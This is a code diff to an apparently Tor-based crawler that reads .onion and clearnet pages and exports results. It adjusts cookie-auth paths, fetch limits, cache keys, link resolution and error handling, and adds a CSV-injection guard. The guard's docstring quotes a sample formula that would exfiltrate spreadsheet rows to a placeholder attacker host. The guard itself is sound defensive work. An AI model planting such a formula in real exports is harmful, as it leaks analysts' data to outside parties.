@@ -65,7 +65,7 @@ import time
 import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Iterator, Optional
-from urllib.parse import urljoin, urlparse, quote_plus, parse_qs, unquote
+from urllib.parse import urljoin, urlparse, urlsplit, urlunsplit, quote_plus, parse_qs, unquote
 
 import requests
 from bs4 import BeautifulSoup
@@ -110,7 +110,7 @@ TOR_SOCKS_PORT     = int(os.getenv("TOR_SOCKS_PORT", "9050"))
 TOR_CONTROL_HOST   = os.getenv("TOR_CONTROL_HOST", "127.0.0.1")
 TOR_CONTROL_PORT   = int(os.getenv("TOR_CONTROL_PORT", "9051"))
 TOR_CONTROL_PASS   = os.getenv("TOR_CONTROL_PASSWORD")
-TOR_DATA_DIR       = os.getenv("TOR_DATA_DIR")   # optional: path to Tor DataDirectory for cookie auth
+TOR_DATA_DIR       = os.path.expanduser(os.getenv("TOR_DATA_DIR") or "") or None  # Tor DataDirectory, for cookie auth
 TOR_TIMEOUT        = int(os.getenv("TOR_TIMEOUT", "45"))
 MAX_CONTENT_CHARS  = int(os.getenv("SICRY_MAX_CHARS", "8000"))
 FETCH_CACHE_TTL    = int(os.getenv("SICRY_CACHE_TTL", "600"))  # seconds; 0 disables
@@ -1119,7 +1119,7 @@ def renew_identity() -> dict:
     Auth is attempted in order:
       1. TOR_CONTROL_PASSWORD env var (HashedControlPassword)
       2. Cookie file from TOR_DATA_DIR env var
-      3. Cookie file from common system paths (/tmp/tor_data, /var/lib/tor, ~/.tor)
+      3. Cookie file from common paths (~/.onionclaw/tor, /var/lib/tor, ~/.tor, /tmp/tor_data)
       4. Empty-string / null auth (no password Tor)
 
     Returns:
@@ -1132,7 +1132,9 @@ def renew_identity() -> dict:
     _COOKIE_PATHS = [
         # explicit override
         os.path.join(TOR_DATA_DIR, "control_auth_cookie") if TOR_DATA_DIR else None,
-        # custom sicry torrc default
+        # the torrc OnionClaw's setup.py writes (a private per-user directory)
+        os.path.expanduser("~/.onionclaw/tor/control_auth_cookie"),
+        # its former, shared location (installs that still use it)
         "/tmp/tor_data/control_auth_cookie",
         # system Tor (Linux/Debian)
         "/var/lib/tor/control_auth_cookie",
@@ -1198,7 +1200,8 @@ def renew_identity() -> dict:
         return {"success": False, "error": str(e)}
 
 
-def fetch(url: str, _use_cache: bool = True) -> dict:
+def fetch(url: str, _use_cache: bool = True, max_chars: int = None,
+          max_links: int = 80) -> dict:
     """
     Fetch any URL through Tor — clearnet OR .onion.
     The exact same as calling fetch_url() or browser_read_page() in a
@@ -1235,9 +1238,17 @@ def fetch(url: str, _use_cache: bool = True) -> dict:
         url = "http://" + url
 
     is_onion = ".onion" in (urlparse(url).hostname or "")
+    # max_chars: None → SICRY_MAX_CHARS (8000, sized for an LLM prompt); 0 → no cap.
+    # Entity extraction needs the whole page: wallets and PGP blocks sit below the fold.
+    limit = MAX_CONTENT_CHARS if max_chars is None else max_chars
 
     # ── TTL cache check ──────────────────────────────────────────
-    cache_key = url.lower().rstrip("/")
+    # Only the scheme and host are case-insensitive: lowercasing the whole URL made
+    # /view/AbC123 and /view/abc123 the same cache entry. The limits are part of the
+    # key so a full-text fetch is never answered with a truncated cached copy.
+    _p = urlsplit(url)
+    cache_key = (f"{urlunsplit((_p.scheme.lower(), _p.netloc.lower(), _p.path or '/', _p.query, ''))}"
+                 f"|{limit}|{max_links}")
     if _use_cache and FETCH_CACHE_TTL > 0 and cache_key in _FETCH_CACHE:
         _cached_ts, _cached_result = _FETCH_CACHE[cache_key]
         if time.time() - _cached_ts < FETCH_CACHE_TTL:
@@ -1279,21 +1290,21 @@ def fetch(url: str, _use_cache: bool = True) -> dict:
             tag.decompose()
         raw_text = re.sub(r"\n{3,}", "\n\n", soup.get_text(separator="\n")).strip()
         # BUG-3: record whether content was truncated (exposed in return dict)
-        truncated = len(raw_text) > MAX_CONTENT_CHARS
-        body_text = raw_text[:MAX_CONTENT_CHARS]
+        truncated = bool(limit) and len(raw_text) > limit
+        body_text = raw_text[:limit] if limit else raw_text
 
-        base = urlparse(final_url)
+        # Resolve every href against the page: only "/"-prefixed ones were made
+        # absolute, so viewtopic.php?t=1, ../wiki and ?page=2 were dropped and
+        # //other.onion/x became a bogus same-host URL.
         links: list[dict] = []
         for a in soup.find_all("a", href=True):
-            href = a["href"].strip()
-            if href.startswith("/"):
-                href = f"{base.scheme}://{base.netloc}{href}"
+            href = urljoin(final_url, a["href"].strip())
             if href.startswith(("http://", "https://")):
                 links.append({"text": a.get_text(strip=True), "href": href})
 
         return {
             "url": final_url, "is_onion": is_onion, "status": resp.status_code,
-            "title": title, "text": body_text, "links": links[:80],
+            "title": title, "text": body_text, "links": links[:max_links],
             "truncated": truncated, "error": None,
         }
 
@@ -1322,10 +1333,15 @@ def fetch(url: str, _use_cache: bool = True) -> dict:
                         ),
                     }
                 result = _parse_response(resp, final_url)
-                # Store in both in-memory and SQLite cache on success
+                # Store in both in-memory and SQLite cache on success. A local DB error
+                # (locked or read-only sicry.db) must not turn a page that downloaded
+                # fine into a network failure and a second download.
                 if _use_cache and FETCH_CACHE_TTL > 0:
                     _FETCH_CACHE[cache_key] = (time.time(), result)
-                    _db().cache_set(cache_key, "fetch", result)
+                    try:
+                        _db().cache_set(cache_key, "fetch", result)
+                    except Exception as db_err:
+                        logging.warning("SICRY: could not cache %s: %s", attempt_url, db_err)
                 return result
             except Exception as exc:
                 last_err = _friendly_error(exc)
@@ -2123,6 +2139,20 @@ def to_stix(
     }
 
 
+_CSV_FORMULA_START = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value):
+    """Neutralise a cell a spreadsheet would run as a formula (OWASP CSV injection).
+
+    Titles come from onion operators: =HYPERLINK("http://attacker/?d="&B2) in a title
+    would send the analyst's other rows to the attacker when the export is opened.
+    """
+    if isinstance(value, str) and value.startswith(_CSV_FORMULA_START):
+        return "'" + value
+    return value
+
+
 def to_csv(results: list[dict]) -> str:
     """Serialise search or crawl results to a CSV string.
 
@@ -2151,9 +2181,9 @@ def to_csv(results: list[dict]) -> str:
     ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
     for r in results:
         writer.writerow({
-            "title":      r.get("title", ""),
-            "url":        r.get("url", ""),
-            "engine":     r.get("engine", ""),
+            "title":      _csv_safe(r.get("title") or ""),
+            "url":        _csv_safe(r.get("url") or ""),
+            "engine":     _csv_safe(r.get("engine") or ""),
             "confidence": r.get("confidence", r.get("score", "")),
             "timestamp":  ts,
         })
